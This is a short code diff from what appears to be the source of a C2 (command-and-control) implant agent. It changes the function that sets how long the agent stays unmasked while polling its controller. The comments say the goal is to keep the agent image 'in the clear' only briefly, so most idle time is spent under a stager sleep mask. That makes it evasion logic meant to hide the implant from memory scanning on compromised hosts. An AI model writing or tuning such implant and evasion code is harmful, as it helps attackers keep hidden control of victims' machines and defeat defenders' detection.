@@ -194,24 +194,21 @@ static int pending_append(hp_ctx *h, const uint8_t *data, size_t len) {
   return 0;
 }
 
-/* Keep the unmasked poll window short compared with the beacon interval, so
- * the agent spends most of its idle time in the stager sleep mask. cc_timeout
- * bounds a response wait; never let the window exceed half the interval. */
+/* Keep the unmasked poll window short compared with the beacon interval so
+ * the agent spends most of its idle time in the stager sleep mask. The C2
+ * long-poll hold is 35-70s; a 10% poll window (1-15s) is enough to pick up
+ * queued work without keeping the agent image in the clear for long. */
 static long hp_read_timeout_s(const c2_agent_config *cfg) {
-  long timeout = 10;
-  if (cfg->cc_timeout_ms > 0)
-    timeout = ((long)cfg->cc_timeout_ms + 999) / 1000;
+  long timeout = 5;
   if (cfg->poll_interval > 0) {
-    long half = cfg->poll_interval / 2;
-    if (half < 1)
-      half = 1;
-    if (timeout > half)
-      timeout = half;
+    timeout = cfg->poll_interval / 10;
+  } else if (cfg->cc_timeout_ms > 0) {
+    timeout = ((long)cfg->cc_timeout_ms + 999) / 1000;
   }
   if (timeout < 1)
     timeout = 1;
-  if (timeout > 90)
-    timeout = 90;
+  if (timeout > 15)
+    timeout = 15;
   return timeout;
 }
 
